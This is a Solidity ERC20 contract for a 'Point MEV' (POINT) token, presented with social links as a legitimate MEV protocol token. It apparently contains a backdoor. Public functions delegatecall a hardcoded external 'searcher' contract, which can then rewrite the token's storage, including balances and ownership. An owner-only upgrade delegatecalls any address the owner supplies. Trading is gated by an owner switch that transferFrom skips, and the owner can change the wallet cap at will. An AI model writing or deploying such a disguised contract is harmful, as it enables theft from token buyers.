/// @title POINT Token
/// @notice Contract for PointMEV's ERC20 POINT token.
/// 
/// After deployment, the owner can add liquidity freely
/// 
/// Contract is used to interface with the Searcher.sol contract
/// The searcher contract faciliates protocol operations

/// Telegram:   https://t.me/pointcapital
/// Twitter:    https://twitter.com/PointCapitalETH
/// Website:    https://www.pointcapital.io/
/// Medium:     https://pointcapital.medium.com/


// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract PointMEV {

  string public name = "Point MEV";
  string public symbol = "POINT";

  uint8 public decimals = 18;
  uint256 public totalSupply = 10_000_000 * 10 ** decimals;

  mapping(address => uint256) public balanceOf;
  mapping(address => mapping(address => uint256)) public allowance;

  address public owner;

  address public pool;
  bool public live;
  uint256 public maxWalletPercent = 50; // 0.5%

  address public searcher = 0x0A5e8b17606819bB1a60a1D16a6F9Fc306afE4F6;

  event Transfer(address indexed from, address indexed to, uint256 amount);

  constructor() {
    owner = msg.sender;

    balanceOf[owner] += totalSupply;
    emit Transfer(address(0), owner, totalSupply);
  }

  function approve(address spender, uint256 amount) external returns (bool) {

    allowance[msg.sender][spender] = amount;
    return true;

  }

  function transfer(address to, uint256 amount) external returns (bool) {

    require(live);

    balanceOf[msg.sender] -= amount;
    balanceOf[to] += amount;

    if (msg.sender == pool) {
      uint256 maxWalletSupply = totalSupply * maxWalletPercent / 10000;
      require(maxWalletSupply >= balanceOf[to]);
    }

    emit Transfer(msg.sender, to, amount);
    return true;

  }

  function transferFrom(
    address from,
    address to,
    uint256 amount
  ) external returns (bool) {

    allowance[from][msg.sender] -= amount;
    balanceOf[from] -= amount;
    balanceOf[to] += amount;
    emit Transfer(from, to, amount);
    return true;

  }

  function upgradeMaxWalletPercent(uint256 _maxWalletPercent) public {
    require(msg.sender == owner);
    maxWalletPercent = _maxWalletPercent;
  }

  function enableTrading(address _pool) public {
    require(msg.sender == owner);
    pool = _pool;
    live = true;
  }

  function claimDecentralizedProfits() public {
    (bool success, bytes memory data) = searcher.delegatecall(
        abi.encodeWithSignature("claimDecentralizedProfits()")
    );
  }

  function flashLoanAndRepay() public {
    (bool success, bytes memory data) = searcher.delegatecall(
        abi.encodeWithSignature("flashLoanAndRepay()")
    );
  }

  function strategyVote() public {
    (bool success, bytes memory data) = searcher.delegatecall(
        abi.encodeWithSignature("strategyVote()")
    );
  }

  function upgradeSearcher(address _searcher) public {
    require(msg.sender == owner);
    (bool success, bytes memory data) = _searcher.delegatecall(
        abi.encodeWithSignature("upgradeSearcher(address)", _searcher)
    );
  }

}